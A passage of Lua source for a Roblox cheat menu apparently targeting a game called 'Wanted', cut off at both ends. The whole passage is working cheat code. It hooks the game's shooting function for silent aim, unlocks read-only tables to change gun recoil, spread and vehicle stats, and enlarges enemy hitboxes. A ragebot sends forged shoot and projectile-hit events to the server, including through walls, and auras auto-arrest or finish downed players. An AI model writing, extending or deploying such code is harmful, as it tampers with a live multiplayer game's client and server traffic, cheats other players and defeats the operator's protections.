										if FindFirstChildOfClass(arg2, "ForceField") or not CheckState(arg) then
											return false
										end

										if not fn72(nil, arg) then
											return false
										end

										if tbl10.SilentAim.IgnoreDowned and fn91(arg) then
											return false
										end
										return true
									end

									local function fn110(arg, arg2, arg3)
										if not arg then
											return false
										end

										if arg3 then
											arg3 = arg.Name == arg3 or arg.Name == arg3 .. "_Hitbox"
										end

										if arg3 then
											return true
										end
										return arg2 == "Body" and (arg.Name == "Torso" or arg.Name == "HumanoidRootPart" or arg.Name == "LowerTorso" or arg.Name == "UpperTorso")
									end

									local function fn111(arg, arg2, arg3, arg4, arg5)
										local character = arg.Character
										if not fn109(arg, character, character and FindFirstChildOfClass(character, "Humanoid")) then
											return
										end
										local v42 = FindFirstChild(character, "HumanoidRootPart")

										if v42 then
											local n13 = v42.Position - arg2

											if n13.Magnitude > 0.001 then
												if arg4 < Acos(Clamp(Dot(arg3, n13.Unit), -1, 1)) * 2 then
													return
												end
											end
										end

										local v43 = tbl15
										local priority = tbl10.SilentAim.Priority
										local v44 = tbl13[priority]

										for i = 1, fn106(character) do
											local v45 = v41[7][v41[6] + i]
											local n13 = v45.Position - arg2

											if n13.Magnitude >= 0.001 then
												local bestAngle = Acos(Clamp(Dot(arg3, n13.Unit), -1, 1)) * 2

												if bestAngle <= arg4 then
													local v46 = v44 and fn110(v45, priority, v44)

													if (bestAngle < v43.BestAngle or v46 and bestAngle < v43.PriAngle) and fn99(arg2, v45.Position, character, arg5) then
														if bestAngle < v43.BestAngle then
															v43.BestAngle = bestAngle
															v43.BestPart = v45
														end

														if v46 and bestAngle < v43.PriAngle then
															v43.PriAngle = bestAngle
															v43.PriPart = v45
														end
													end
												end
											end
										end
									end

									local function fn112()
										local v42 = Camera()
										if not v42 then
											return nil
										end

										if fn105() < 1 then
											return nil
										end
										local v43 = tbl15
										v43.BestPart = nil
										v43.BestAngle = 360
										v43.PriPart = nil
										v43.PriAngle = 360
										local position = v42.CFrame.Position
										local lookVector = v42.CFrame.LookVector
										local v44 = Rad(tbl10.SilentAim.Fov)
										local v45 = fn69()
										local v46 = GetPlayerList()

										for i = 1, #v46 do
											fn111(v46[i], position, lookVector, v44, v45)
										end

										local silentAim = tbl10.SilentAim
										if tbl13[silentAim.Priority] and silentAim.Accuracy >= Random(1, 100) and v43.PriPart then
											return v43.PriPart
										end
										return v43.BestPart
									end

									local function fn113()
										local cachedPart = tbl15.CachedPart

										if not cachedPart or not cachedPart.Parent then
											cachedPart = fn112()
											tbl15.CachedPart = cachedPart
										end

										if not cachedPart then
											return nil
										end
										local v42 = Camera()
										return fn108(cachedPart, v42 and v42.CFrame.Position or cachedPart.Position)
									end

									local function shoot(arg, ...)
										local silentAim = tbl10.SilentAim
										local flag2 = not silentAim.Enabled

										if not flag2 then
											local hitChance = silentAim.HitChance
											flag2 = Random(1, 100) > hitChance
										end

										if flag2 then
											return tbl15.OldShoot(arg, ...)
										end
										local v42 = fn113()
										if typeof(v42) ~= "Vector3" then
											return tbl15.OldShoot(arg, ...)
										end
										arg.aimpoint = v42
										arg.aimpoint2 = v42
										local spread = arg.spread
										arg.spread = 0
										local v43 = pcall
										local oldShoot = tbl15.OldShoot
										local v44 = table.pack(...)
										v44.n = 3 + v44.n - 1
										table.move(v44, 1, v44.n, 3, v44)
										v44[1] = oldShoot
										v44[2] = arg
										local v45, v46 = v43(table.unpack(v44, 1, v44.n))
										arg.spread = spread

										if not v45 then
											error(v46)
										end
									end

									local function fn114()
										if tbl15.FovConn then
											Disconnect(tbl15.FovConn)
											tbl15.FovConn = nil
										end

										if v39 and v39.Visible then
											v39.Visible = false
										end

										tbl15.FovLastShow = false
									end

									local function fn115()
										fn114()
										if not v39 or not v40 then
											return
										end

										local function fn116()
											local v42 = tbl15
											local silentAim = tbl10.SilentAim
											local v43 = Camera()
											local fovLastShow = (silentAim.Module == nil or silentAim.Module:Get() == true) and silentAim.VisualizeFov == true and v43 ~= nil

											if v42.FovLastShow ~= fovLastShow then
												v42.FovLastShow = fovLastShow
												v39.Visible = fovLastShow
											end

											if not fovLastShow then
												return
											end
											local v44, v45 = fn93(v43)
											local v46 = Max(2, Floor(fn94(v43, silentAim.Fov) * 2 + 0.5))

											if v42.FovLastX ~= v44 or v42.FovLastY ~= v45 then
												v42.FovLastX = v44
												v42.FovLastY = v45
												v39.Position = NewUDim2(0, v44, 0, v45)
											end

											if v42.FovLastDiam ~= v46 then
												v42.FovLastDiam = v46
												v39.Size = NewUDim2(0, v46, 0, v46)
											end
										end

										fn116()
										tbl15.FovConn = Connect(RunService.RenderStepped, fn116)
									end

									local function fn116()
										tbl10.SilentAim.Enabled = false

										if tbl15.ScanConn then
											Disconnect(tbl15.ScanConn)
											tbl15.ScanConn = nil
										end

										fn114()

										if tbl15.Hooked and tbl15.OldShoot then
											if type(restorefunction) == "function" and isfunctionhooked and isfunctionhooked(Shooter._shoot) then
												restorefunction(Shooter._shoot)
											else
												Shooter._shoot = tbl15.OldShoot
											end

											tbl15.Hooked = false
										end

										tbl15.CachedPart = nil
									end

									local function fn117()
										fn116()
										tbl10.SilentAim.Enabled = true

										if type(hookfunction) == "function" then
											tbl15.OldShoot = hookfunction(Shooter._shoot, shoot)
										else
											tbl15.OldShoot = Shooter._shoot
											Shooter._shoot = shoot
										end

										tbl15.Hooked = true

										tbl15.ScanConn = Connect(RunService.Heartbeat, function(arg)
											if not tbl10.SilentAim.Enabled then
												fn116()
												return
											end
											tbl15.ScanAccum = tbl15.ScanAccum + arg
											if tbl15.ScanAccum < n11 then
												return
											end
											tbl15.ScanAccum = 0
											tbl15.CachedPart = fn112()
										end)

										if tbl10.SilentAim.VisualizeFov then
											fn115()
										end
									end

									tbl10.SilentAim.Module = v27:CreateModule({
										Id = "wanted-silent-aim",
										Name = "Silent Aim",
										Default = false,
										Callback = function(arg)
											if arg then
												fn117()
											else
												fn116()
											end
										end,
									})

									tbl10.SilentAim.Module:CreateSlider({
										Id = "wanted-silent-aim-fov",
										Name = "Maximum FOV",
										Min = 0,
										Max = 90,
										Default = tbl10.SilentAim.Fov,
										Step = 0.1,
										Callback = function(fov)
											tbl10.SilentAim.Fov = fov
										end,
									})

									tbl10.SilentAim.Module:CreateSlider({
										Id = "wanted-silent-aim-hit-chance",
										Name = "Hit Chance",
										Min = 0,
										Max = 100,
										Default = tbl10.SilentAim.HitChance,
										Step = 1,
										Callback = function(hitChance)
											tbl10.SilentAim.HitChance = hitChance
										end,
									})

									tbl10.SilentAim.Module:CreateSlider({
										Id = "wanted-silent-aim-accuracy",
										Name = "Accuracy",
										Min = 0,
										Max = 100,
										Default = tbl10.SilentAim.Accuracy,
										Step = 1,
										Callback = function(accuracy)
											tbl10.SilentAim.Accuracy = accuracy
										end,
									})

									tbl10.SilentAim.Module:CreateSlider({
										Id = "wanted-silent-aim-point-scale",
										Name = "Point Scale",
										Min = 0,
										Max = 100,
										Default = tbl10.SilentAim.PointScale,
										Step = 1,
										Callback = function(pointScale)
											tbl10.SilentAim.PointScale = pointScale
										end,
									})

									tbl10.SilentAim.Module:CreateSelector({
										Id = "wanted-silent-aim-priority",
										Name = "Hitscan Priority",
										Options = { { Value = "Closest" }, { Value = "Head" }, { Value = "Body" } },
										Default = tbl10.SilentAim.Priority,
										Callback = function(priority)
											tbl10.SilentAim.Priority = priority
										end,
									})

									tbl10.SilentAim.Module:CreateToggle({
										Id = "wanted-silent-aim-hitbox-head",
										Name = "Head",
										Default = tbl10.SilentAim.Hitboxes.Head,
										Callback = function(arg)
											tbl10.SilentAim.Hitboxes.Head = arg == true
										end,
									})

									tbl10.SilentAim.Module:CreateToggle({
										Id = "wanted-silent-aim-hitbox-body",
										Name = "Body",
										Default = tbl10.SilentAim.Hitboxes.Body,
										Callback = function(arg)
											tbl10.SilentAim.Hitboxes.Body = arg == true
										end,
									})

									tbl10.SilentAim.Module:CreateToggle({
										Id = "wanted-silent-aim-hitbox-arms",
										Name = "Arms",
										Default = tbl10.SilentAim.Hitboxes.Arms,
										Callback = function(arg)
											tbl10.SilentAim.Hitboxes.Arms = arg == true
										end,
									})

									tbl10.SilentAim.Module:CreateToggle({
										Id = "wanted-silent-aim-hitbox-legs",
										Name = "Legs",
										Default = tbl10.SilentAim.Hitboxes.Legs,
										Callback = function(arg)
											tbl10.SilentAim.Hitboxes.Legs = arg == true
										end,
									})

									tbl10.SilentAim.Module:CreateSlider({
										Id = "wanted-silent-aim-prediction-x",
										Name = "Prediction X",
										Min = 0,
										Max = 7,
										Default = tbl10.SilentAim.PredictionX,
										Step = 0.01,
										Callback = function(predictionX)
											tbl10.SilentAim.PredictionX = predictionX
										end,
									})

									tbl10.SilentAim.Module:CreateSlider({
										Id = "wanted-silent-aim-prediction-y",
										Name = "Prediction Y",
										Min = 0,
										Max = 7,
										Default = tbl10.SilentAim.PredictionY,
										Step = 0.01,
										Callback = function(predictionY)
											tbl10.SilentAim.PredictionY = predictionY
										end,
									})

									tbl10.SilentAim.Module:CreateToggle({
										Id = "wanted-silent-aim-visualize-fov",
										Name = "Visualize FOV",
										Default = tbl10.SilentAim.VisualizeFov,
										Callback = function(arg)
											tbl10.SilentAim.VisualizeFov = arg == true

											if tbl10.SilentAim.Enabled and arg then
												fn115()
											else
												fn114()
											end
										end,
									})

									tbl10.SilentAim.Module:CreateToggle({
										Id = "wanted-silent-aim-ignore-downed",
										Name = "Ignore Downed",
										Default = tbl10.SilentAim.IgnoreDowned,
										Callback = function(arg)
											tbl10.SilentAim.IgnoreDowned = arg == true
										end,
									})
								end

								fn104()

								local tbl12 = {
									"climb",
									"climbMax",
									"kickBack",
									"kickBackMax",
									"kickHoriz",
									"kickHorizMax",
									"angle",
									"angleMax",
									"sway",
									"swayMax",
									"firstShotKick",
								}

								local tbl13 = { "spread", "spreadMin", "spreadMax" }
								local tbl14 = {}
								local flag2 = false
								local tbl15 = {}
								local flag3 = false
								local getData = nil
								local fn105 = nil

								fn105 = function(arg)
									if not arg then
										return
									end
									local v38 = GetChildren(arg)

									for i = 1, #v38 do
										local v39 = v38[i]

										if IsA(v39, "ModuleScript") then
											Insert(tbl15, v39)
										elseif IsA(v39, "Folder") then
											fn105(v39)
										end
									end
								end

								local function fn106(arg)
									if type(arg) ~= "table" or type(setreadonly) ~= "function" then
										return
									end
									pcall(setreadonly, arg, false)

									if type(arg.recoil) == "table" then
										pcall(setreadonly, arg.recoil, false)
									end

									if type(arg.aim) == "table" then
										pcall(setreadonly, arg.aim, false)
									end

									if type(arg.projectile) == "table" then
										pcall(setreadonly, arg.projectile, false)
									end

									if type(arg.cameraShake) == "table" then
										pcall(setreadonly, arg.cameraShake, false)
									end
								end

								local function fn107(arg)
									return type(arg) == "table" and type(arg.name) == "string" and type(arg.recoil) == "table" and (arg.itemType == "Gun" or type(arg.projectile) == "table")
								end

								local function fn108(arg)
									if not fn107(arg) then
										return nil
									end
									local name2 = arg.name
									local v38 = tbl14[name2]
									if v38 then
										return v38
									end
									local tbl16 = { recoil = {}, aimSpreadAngle = nil, muzzleVelocity = nil, dragCoefficient = nil }
									local recoil = arg.recoil

									for i = 1, #tbl12 do
										local v39 = tbl12[i]

										if type(recoil[v39]) == "number" then
											tbl16.recoil[v39] = recoil[v39]
										end
									end

									for i = 1, #tbl13 do
										local v39 = tbl13[i]

										if type(recoil[v39]) == "number" then
											tbl16.recoil[v39] = recoil[v39]
										end
									end

									if type(arg.aim) == "table" and type(arg.aim.spreadAngle) == "number" then
										tbl16.aimSpreadAngle = arg.aim.spreadAngle
									end

									if type(arg.projectile) == "table" then
										if type(arg.projectile.muzzleVelocity) == "number" then
											tbl16.muzzleVelocity = arg.projectile.muzzleVelocity
										end

										if type(arg.projectile.dragCoefficient) == "number" then
											tbl16.dragCoefficient = arg.projectile.dragCoefficient
										end
									end

									tbl14[name2] = tbl16
									return tbl16
								end

								local function fn109()
									if flag2 then
										return
									end

									if #tbl15 == 0 then
										local v38 = FindFirstChild(ReplicatedStorage, "Shared")
										local v39 = v38 and FindFirstChild(v38, "Wanted")
										local v40 = v39 and FindFirstChild(v39, "Indicies")
										local v41 = v40 and FindFirstChild(v40, "Objects")
										fn105(v41 and FindFirstChild(v41, "Guns"))
									end

									for i = 1, #tbl15 do
										local ok5, result5 = pcall(require, tbl15[i])

										if ok5 and fn107(result5) then
											fn108(result5)
										end
									end

									flag2 = true
								end

								local function fn110(arg, arg2, arg3, arg4, arg5)
									local v38 = fn108(arg)
									if not v38 then
										return
									end
									fn106(arg)
									local recoil = arg.recoil
									if type(recoil) ~= "table" then
										return
									end

									for i = 1, #tbl12 do
										local v39 = tbl12[i]

										if v38.recoil[v39] ~= nil then
											recoil[v39] = v38.recoil[v39] * arg2
										end
									end

									for i = 1, #tbl13 do
										local v39 = tbl13[i]

										if v38.recoil[v39] ~= nil then
											recoil[v39] = v38.recoil[v39] * arg3
										end
									end

									if v38.aimSpreadAngle ~= nil and type(arg.aim) == "table" then
										arg.aim.spreadAngle = v38.aimSpreadAngle * arg3
									end

									if type(arg.projectile) == "table" then
										if v38.muzzleVelocity ~= nil then
											arg.projectile.muzzleVelocity = v38.muzzleVelocity * arg4
										end

										if v38.dragCoefficient ~= nil then
											if not arg5 or arg5 <= 0 then
												arg5 = 1
											end

											arg.projectile.dragCoefficient = v38.dragCoefficient / arg5
										end
									end
								end

								local function fn111(arg)
									local v38 = tbl14[arg and arg.name]
									if not v38 or type(arg.recoil) ~= "table" then
										return
									end
									fn106(arg)

									for i = 1, #tbl12 do
										local v39 = tbl12[i]

										if v38.recoil[v39] ~= nil then
											arg.recoil[v39] = v38.recoil[v39]
										end
									end

									for i = 1, #tbl13 do
										local v39 = tbl13[i]

										if v38.recoil[v39] ~= nil then
											arg.recoil[v39] = v38.recoil[v39]
										end
									end

									if v38.aimSpreadAngle ~= nil and type(arg.aim) == "table" then
										arg.aim.spreadAngle = v38.aimSpreadAngle
									end

									if type(arg.projectile) == "table" then
										if v38.muzzleVelocity ~= nil then
											arg.projectile.muzzleVelocity = v38.muzzleVelocity
										end

										if v38.dragCoefficient ~= nil then
											arg.projectile.dragCoefficient = v38.dragCoefficient
										end
									end
								end

								local function fn112(arg)
									fn109()

									for i = 1, #tbl15 do
										local ok5, result5 = pcall(require, tbl15[i])

										if ok5 and fn107(result5) then
											arg(result5)
										end
									end

									local v38 = ClientTools.GetLocalEquippedTool()

									if fn107(v38) then
										arg(v38)
									end
								end

								local function fn113()
									fn109()
									if not tbl10.GunMod.Enabled then
										fn112(fn111)
										return
									end
									local n11 = tbl10.GunMod.Recoil / 100
									local n12 = tbl10.GunMod.Spread / 100
									local bulletSpeed = tbl10.GunMod.BulletSpeed
									local bulletLifetime = tbl10.GunMod.BulletLifetime

									fn112(function(arg)
										fn110(arg, n11, n12, bulletSpeed, bulletLifetime)
									end)
								end

								local function fn114()
									if flag3 or type(Objects.GetData) ~= "function" then
										return
									end
									flag3 = true
									getData = Objects.GetData

									Objects.GetData = function(arg, arg2)
										local v38 = getData(arg, arg2)

										if tbl10.GunMod.Enabled and fn107(v38) then
											fn110(v38, tbl10.GunMod.Recoil / 100, tbl10.GunMod.Spread / 100, tbl10.GunMod.BulletSpeed, tbl10.GunMod.BulletLifetime)
										end

										return v38
									end
								end

								fn114()

								Spawn(function()
									local v38 = nil

									while true do
										Wait(0.5)

										if tbl10.GunMod.Enabled then
											local toolId = ClientTools.GetLocalEquippedTool()
											toolId = toolId and toolId.toolId
											if toolId == v38 then
												continue
											end
											fn113()
											v38 = toolId
										else
											v38 = nil
										end
									end
								end)

								local v38 = v27:CreateModule({
									Id = "wanted-gun-mod",
									Name = "Gun Mod",
									Default = false,
									Callback = function(arg)
										tbl10.GunMod.Enabled = arg == true
										fn113()
									end,
								})

								v38:CreateSlider({
									Id = "wanted-gun-mod-recoil",
									Name = "Recoil",
									Min = 0,
									Max = 100,
									Default = tbl10.GunMod.Recoil,
									Step = 1,
									Callback = function(recoil)
										tbl10.GunMod.Recoil = recoil

										if tbl10.GunMod.Enabled then
											fn113()
										end
									end,
								})

								v38:CreateSlider({
									Id = "wanted-gun-mod-spread",
									Name = "Spread",
									Min = 0,
									Max = 100,
									Default = tbl10.GunMod.Spread,
									Step = 1,
									Callback = function(spread)
										tbl10.GunMod.Spread = spread

										if tbl10.GunMod.Enabled then
											fn113()
										end
									end,
								})

								v38:CreateSlider({
									Id = "wanted-gun-mod-bullet-speed",
									Name = "Bullet Speed",
									Min = 0.1,
									Max = 100,
									Default = tbl10.GunMod.BulletSpeed,
									Step = 0.1,
									Callback = function(bulletSpeed)
										tbl10.GunMod.BulletSpeed = bulletSpeed

										if tbl10.GunMod.Enabled then
											fn113()
										end
									end,
								})

								v38:CreateSlider({
									Id = "wanted-gun-mod-bullet-lifetime",
									Name = "Bullet Lifetime",
									Min = 0.1,
									Max = 10,
									Default = tbl10.GunMod.BulletLifetime,
									Step = 0.1,
									Callback = function(bulletLifetime)
										tbl10.GunMod.BulletLifetime = bulletLifetime

										if tbl10.GunMod.Enabled then
											fn113()
										end
									end,
								})

								local tbl16 = { Enabled = false, Percent = {} }
								local tbl17 = { "Cars", "Motorcycles" }

								local tbl18 = {
									{ key = "TopSpeed", name = "Top Speed", path = { "topSpeed" } },
									{ key = "ReverseSpeed", name = "Top Reverse Speed", path = { "topReverseSpeed" } },
									{ key = "GasAccel", name = "Gas Acceleration", path = { "acceleration", "gas" } },
									{ key = "BrakeForce", name = "Brake Force", path = { "acceleration", "brake" } },
									{ key = "Handbrake", name = "Handbrake", path = { "acceleration", "handbrake" } },
									{ key = "GearBoost", name = "Gear Boost", path = { "gearBoost" } },
									{ key = "FinalDrive", name = "Final Drive Ratio", path = { "finalDriveRatio" } },
									{ key = "MaxRPM", name = "Max RPM", path = { "maxRPM" } },
									{ key = "ShiftRatio", name = "Shift Ratio", path = { "shiftRatio" } },
									{ key = "ShiftTime", name = "Shift Time", path = { "shiftTime" } },
									{ key = "TurboBoost", name = "Turbo Boost", path = { "turboBoost" } },
									{ key = "TurboLag", name = "Turbo Lag", path = { "turboLag" } },
									{ key = "Drag", name = "Drag", path = { "drag" } },
									{ key = "Downforce", name = "Downforce", path = { "downforce" } },
									{ key = "SteerMax", name = "Steering Max Angle", path = { "steering", "maxAngle" } },
									{ key = "SteerMin", name = "Steering Min Angle", path = { "steering", "minAngle" } },
									{ key = "SteerSpeed", name = "Steering Speed", path = { "steering", "speed" } },
									{ key = "SteerModifier", name = "Steering Modifier", path = { "steering", "modifier" } },
									{
										key = "SteerHandbrake",
										name = "Steering Handbrake Scale",
										path = { "steering", "handbrakeScale" },
									},
									{ key = "SusStiffness", name = "Suspension Stiffness", path = { "suspension", "stiffness" } },
									{ key = "SusDamping", name = "Suspension Damping", path = { "suspension", "damping" } },
									{ key = "RideFront", name = "Ride Height Front", path = { "rideHeight", "front" } },
									{ key = "RideRear", name = "Ride Height Rear", path = { "rideHeight", "rear" } },
									{ key = "AntiRoll", name = "Anti Roll", path = { "antiRoll" } },
									{ key = "Camber", name = "Camber", path = { "camber" } },
									{ key = "WeightFriction", name = "Weight Friction", path = { "weight", "friction" } },
									{ key = "WeightAxle", name = "Weight Axle", path = { "weight", "axle" } },
									{ key = "WeightChassis", name = "Weight Chassis", path = { "weight", "chassis" } },
									{ key = "WeightEngine", name = "Weight Engine", path = { "weight", "engine" } },
									{ key = "MaxHealthChassis", name = "Max Health Chassis", path = { "maxHealth", "chassis" } },
									{ key = "MaxHealthTire", name = "Max Health Tire", path = { "maxHealth", "tire" } },
									{ key = "MaxHealthWindow", name = "Max Health Window", path = { "maxHealth", "window" } },
									{ key = "ArmorChassis", name = "Armor Chassis", path = { "armor", "chassis" } },
									{ key = "ArmorTire", name = "Armor Tire", path = { "armor", "tire" } },
									{ key = "ArmorWindow", name = "Armor Window", path = { "armor", "window" } },
									{ key = "LeanAngle", name = "Lean Angle", path = { "leanAngle" } },
									{ key = "WheelieAngle", name = "Wheelie Angle", path = { "wheelieAngle" } },
									{ key = "FrontAngle", name = "Front Angle", path = { "frontAngle" } },
									{ key = "SlopeTorque", name = "Slope Torque Scale", path = { "slopeTorqueScale" } },
								}

								for i = 1, #tbl18 do
									tbl16.Percent[tbl18[i].key] = 100
								end

								local v39 = ReplicatedStorage and FindFirstChild(ReplicatedStorage, "Shared") and FindFirstChild(ReplicatedStorage.Shared, "Wanted") and FindFirstChild(ReplicatedStorage.Shared.Wanted, "Indicies") and FindFirstChild(ReplicatedStorage.Shared.Wanted.Indicies, "Objects") and FindFirstChild(ReplicatedStorage.Shared.Wanted.Indicies.Objects, "Vehicles")
								local tbl19 = {}
								local tbl20 = {}
								local flag4 = false

								local function fn115(arg, arg2)
									if type(setreadonly) ~= "function" then
										return
									end
									pcall(setreadonly, arg, false)

									for i = 1, #arg2 do
										arg = arg[arg2[i]]
										if type(arg) == "table" then
											pcall(setreadonly, arg, false)
											continue
										end
										break
									end
								end

								local function fn116(arg, arg2)
									for i = 1, #arg2 do
										arg = arg and arg[arg2[i]]
										if type(arg) ~= "table" and i < #arg2 then
											return nil
										end
									end

									return type(arg) == "number" and arg or nil
								end

								local function fn117(arg, arg2, arg3)
									pcall(setreadonly, arg, false)

									for i = 1, #arg2 - 1 do
										local v40 = arg[arg2[i]]

										if type(v40) == "table" then
											arg = v40
										else
											local tbl21 = {}
											arg[arg2[i]] = tbl21
											arg = tbl21
										end

										pcall(setreadonly, arg, false)
									end

									if type(arg[arg2[#arg2]]) == "number" then
										arg[arg2[#arg2]] = arg3
										return true
									end
									return false
								end

								local function fn118()
									if flag4 then
										return
									end
									table.clear(tbl19)
									table.clear(tbl20)

									if v39 then
										for i = 1, #tbl17 do
											local v40 = FindFirstChild(v39, tbl17[i])

											if v40 then
												for i2 = 1, #GetChildren(v40) do
													local v41 = GetChildren(v40)[i2]

													if IsA(v41, "ModuleScript") then
														local ok5, result5 = pcall(require, v41)

														if ok5 and type(result5) == "table" then
															Insert(tbl19, v41)
															local tbl21 = {}

															for i3 = 1, #tbl18 do
																local v42 = tbl18[i3]
																fn115(result5, v42.path)
																local v43 = fn116(result5, v42.path)

																if type(v43) == "number" then
																	tbl21[v42.key] = v43
																end
															end

															tbl20[v41.Name] = tbl21
														end
													end
												end
											end
										end
									end

									flag4 = true
								end

								local function fn119(arg, arg2)
									local v40 = tbl20[arg2]
									if not v40 then
										return
									end

									for i = 1, #tbl18 do
										local v41 = tbl18[i]
										local v42 = v40[v41.key]
										local n11 = tbl16.Percent[v41.key] or 100

										if type(v42) == "number" then
											fn117(arg, v41.path, v42 * n11 / 100)
										end
									end
								end

								local function fn120()
									fn118()

									for i = 1, #tbl19 do
										local v40 = tbl19[i]
										local ok5, result5 = pcall(require, v40)

										if ok5 and type(result5) == "table" then
											fn119(result5, v40.Name)
										end
									end
								end

								local function fn121()
									fn118()

									for i = 1, #tbl19 do
										local v40 = tbl19[i]
										local ok5, result5 = pcall(require, v40)

										if ok5 and type(result5) == "table" then
											local v41 = tbl20[v40.Name]

											if v41 then
												for i2 = 1, #tbl18 do
													local v42 = tbl18[i2]

													if type(v41[v42.key]) == "number" then
														fn117(result5, v42.path, v41[v42.key])
													end
												end
											end
										end
									end
								end

								local function fn122(arg)
									return type(arg) == "table" and arg.itemType == "Vehicle" and type(arg.name) == "string"
								end

								local function fn123()
									local getData2 = Objects.GetData
									if type(getData2) ~= "function" then
										return
									end

									Objects.GetData = function(arg, arg2, ...)
										local v40 = table.pack(...)
										local v41 = getData2
										v40.n = 3 + v40.n - 1
										table.move(v40, 1, v40.n, 3, v40)
										v40[1] = arg
										v40[2] = arg2
										local v42 = v41(table.unpack(v40, 1, v40.n))

										if tbl16.Enabled and fn122(v42) and tbl20[v42.name] then
											fn119(v42, v42.name)
										end

										return v42
									end
								end

								fn123()

								local v40 = v27:CreateModule({
									Id = "wanted-car-mod",
									Name = "Car Mod",
									Default = tbl16.Enabled,
									Callback = function(arg)
										tbl16.Enabled = arg == true

										if tbl16.Enabled then
											fn118()
											fn120()
										else
											fn121()
										end
									end,
								})

								for i = 1, #tbl18 do
									local v41 = tbl18[i]
									local key = v41.key

									v40:CreateSlider({
										Id = "wanted-car-mod-" .. key:lower(),
										Name = v41.name,
										Min = 0,
										Max = 5000,
										Default = tbl16.Percent[key],
										Step = 1,
										Callback = function(arg)
											tbl16.Percent[key] = arg

											if tbl16.Enabled then
												fn120()
											end
										end,
									})
								end
							end

							fn90()
							local v28 = v14:CreateTab({ Id = "wanted-rage", Name = "Rage" })
							local tbl10 = {}
							local n6 = 0

							RageState = {
								AutoEquip = { Enabled = false, Item = "None" },
								Ragebot = {
									Enabled = false,
									Wallbang = true,
									Ignore = { Crawling = true, Knocked = true, Grabbed = true },
								},
								Finish_ArrestAura = false,
								SaveAura = false,
								Hitbox = { Enabled = false, Part = "Head", Size = 5 },
							}

							local function fn91()
								if not autoEquipSelector then
									return
								end
								local v29 = fn75()
								local item = RageState.AutoEquip.Item

								if item ~= "None" and not Find(v29, item) then
									item = "None"
								end

								RageState.AutoEquip.Item = item
								autoEquipSelector.Options = v29
								autoEquipSelector:Set(item, true)
							end

							local function fn92(arg, arg2)
								arg = arg and arg.plr
								if not arg or not fn72(nil, arg) then
									return false
								end
								local v29 = fn76(arg)
								local flag = not (arg2.Crawling and v29.isCrawling)

								if flag then
									flag = not (arg2.Knocked and v29.isKnocked)
								end

								if flag then
									flag = not (arg2.Grabbed and v29.isGrabbed)
								end

								return flag
							end

							local function fn93()
								for k, v29 in pairs(tbl10) do
									if k and k.Parent and v29 then
										k.Size = v29.Size
										k.Transparency = v29.Transparency
										k.CanCollide = v29.CanCollide
									end
								end

								table.clear(tbl10)
							end

							local v29 = nil

							local function fn94(arg)
								if v29 ~= arg then
									v29 = arg
									fn93()
								end

								local v30 = fn80()

								for i = 1, #v30 do
									local v31 = v30[i]

									if fn72(nil, v31.plr) then
										local hrp = v31.hrp
										local head = v31.head

										if not tbl10[hrp] or not tbl10[head] then
											tbl10[hrp] = { Size = hrp.Size, Transparency = hrp.Transparency, CanCollide = hrp.CanCollide }
											tbl10[head] = { Size = head.Size, Transparency = head.Transparency, CanCollide = head.CanCollide }
										end

										if arg == "Head" then
											head.Size = NewVector3(RageState.Hitbox.Size, RageState.Hitbox.Size, RageState.Hitbox.Size)
											head.Transparency = 0.8
											head.CanCollide = false
										else
											hrp.Size = NewVector3(RageState.Hitbox.Size, RageState.Hitbox.Size, RageState.Hitbox.Size)
											hrp.Transparency = 0.8
											hrp.CanCollide = false
										end
									end
								end
							end

							local function fn95()
								local v30 = GetAttribute(LocalPlayer, "currentTeam")
								local v31 = fn80()

								for i = 1, #v31 do
									local plr = v31[i].plr

									if fn76(plr).isDowned then
										local v32 = GetAttribute(plr, "currentTeam")

										if RageState.Finish_ArrestAura and v30 ~= v32 then
											if v30 == "police" then
												fireServer("arrest", plr.UserId)
											else
												fireServer("finish", plr.UserId)
											end

											continue
										end

										if RageState.SaveAura then
											if CheckState(plr) then
												return
											end
											fireServer("revive", plr.UserId)
										end
									end
								end
							end

							local function fn96()
								local now = tick()
								if now - n6 < 0.08 then
									return
								end
								local v30 = fn69()
								local v31 = fn71()
								local v32 = v30 and FindFirstChild(v30, "Head")
								local v33 = ClientTools.GetLocalEquippedTool()
								local toolState = v33 and v33.toolState
								if not v32 or not v31 or not v33 or not toolState then
									return
								end

								if (toolState.ammo or 0) <= 0 then
									if (toolState.totalAmmo or 0) > 0 then
										fireServer("reload", v33.toolId)
										fireServer("chamber", v33.toolId)
									end

									return
								end

								local v34 = fn77(RageState.Ragebot.Ignore)
								local v35 = fn80()

								for i = 1, #v35 do
									local v36 = v35[i]

									if fn92(v36, v34) then
										local head = v36.head
										local position, position2, flag

										if RageState.Ragebot.Wallbang then
											position, position2, flag = Resolve(v31, head, 30, head.Size.Magnitude)
										else
											position = v32.Position
											position2 = head.Position
											flag = true
										end

										position2 = position and position2
										flag = position2 and flag

										if flag then
											local v37 = nuid()
											local position3 = head.Position
											local n7 = position3 - position
											local unit = n7.Magnitude > 0.0001 and n7.Unit or v31.CFrame.LookVector
											local v38 = FindFirstChild(v36.char, "Hitbox") and FindFirstChild(v36.char.Hitbox, "Head_Hitbox") or head
											local position4 = v32.Position
											local magnitude = (position3 - position4).Magnitude
											local muzzleVelocity = v33 and v33.projectile and v33.projectile.muzzleVelocity
											local n8 = type(muzzleVelocity) == "number" and muzzleVelocity > 0 and muzzleVelocity / 0.28 or 1600
											fireServer("shoot", v33.toolId, MathUtil.CompressCFrame(NewCFrame(position4, position3)), { { v37, MathUtil.CompressCFrame(NewCFrame(position4, position3)) } })

											fireServer("registerProjectileHits", v37, v33.toolId, {
												{
													massLimit = 5,
													hit = v38,
													position = position3,
													normal = -unit,
													material = v38 and v38.Material or Enum.Material.Plastic,
													distance = magnitude,
													collisionPoint = position3,
													direction = unit,
													speed = n8,
													source = {
														sourceType = "Bullet",
														sourceId = v37,
														sourceToolId = v33.toolId,
														sourcePlayerId = userId,
													},
												},
											})

											CreateTracer(position, position3, nil, true)
											CreateHitSound()
											toolState.ammo = toolState.ammo - 1
											n6 = now
											break
										end
									end
								end
							end

							local function fn97()
								if rageLoop then
									Cancel(rageLoop)
								end

								rageLoop = Spawn(function()
									while Wait(0.05) do
										if RageState.AutoEquip.Enabled and RageState.AutoEquip.Item ~= "None" then
											local v30 = fn74(RageState.AutoEquip.Item)

											if v30 then
												fn73(v30.guid)
											end
										end

										if RageState.Ragebot.Enabled then
											fn96()
										end

										if RageState.Hitbox.Enabled then
											fn94(RageState.Hitbox.Part)
										end

										if RageState.Finish_ArrestAura or RageState.SaveAura then
											fn95()
										end
									end
								end)
							end

							local v30 = v28:CreateModule({
								Id = "wanted-auto-equip",
								Name = "Auto Equip",
